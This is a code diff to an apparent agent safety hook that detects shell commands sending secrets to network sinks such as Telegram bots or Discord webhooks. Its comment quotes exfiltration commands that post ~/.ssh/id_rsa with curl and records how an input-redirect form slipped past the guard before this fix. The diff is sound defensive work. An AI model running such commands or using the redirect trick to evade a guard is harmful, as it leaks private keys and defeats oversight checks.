@@ -97,10 +97,24 @@ _NETWORK_SINK_PATTERNS = (
                r"|api\.telegram\.org/bot\d|discord\.com/api/webhooks)\b"),
 )
 
-# Pipe / sequencer tokens that bridge two parts of a single shell action.
+# Pipe / sequencer / REDIRECT tokens that bridge two parts of a single shell action.
 # We split the command into segments around these and look for source+sink
 # spread across the split.
-_SEPARATOR_RE = re.compile(r"\s*(?:\||;|&&|\|\||\bxargs\b)\s*")
+#
+# `<`, `<<<` and `<(` are separators for the same reason `|` is: they feed a source into
+# a sink. Omitting them was a live bypass of exactly this predicate, reproduced
+# 2026-08-14 — `cat ~/.ssh/id_rsa | curl -d @- <sink>` was CAUGHT while
+# `curl -d @- <sink> < ~/.ssh/id_rsa` was ALLOWED. Same source, same sink, same
+# exfiltration, one character apart: the redirect form is a SINGLE segment, so
+# `len(parts) < 2` returned None and the caller silently allowed it. CC 2.1.232 closed
+# the equivalent hole at the harness layer ("Bash input redirections (`< file`) are now
+# permission-checked like their argument spellings"); this closes it in the janitor's own
+# guard, which must not be weaker than the harness it supplements.
+#
+# Ordering is load-bearing: `<<<` must precede `<` in the alternation, or the herestring
+# splits as `<` + `<<`-remnant. Adding split points can only INCREASE segmentation, so this
+# can never make a previously-caught command pass — it can only catch more.
+_SEPARATOR_RE = re.compile(r"\s*(?:\||;|&&|\|\||\bxargs\b|<<<|<\(|<)\s*")
 
 # Sensitive write paths — anywhere the hook denies surgical writes.
 _SENSITIVE_WRITE_PATTERNS = (
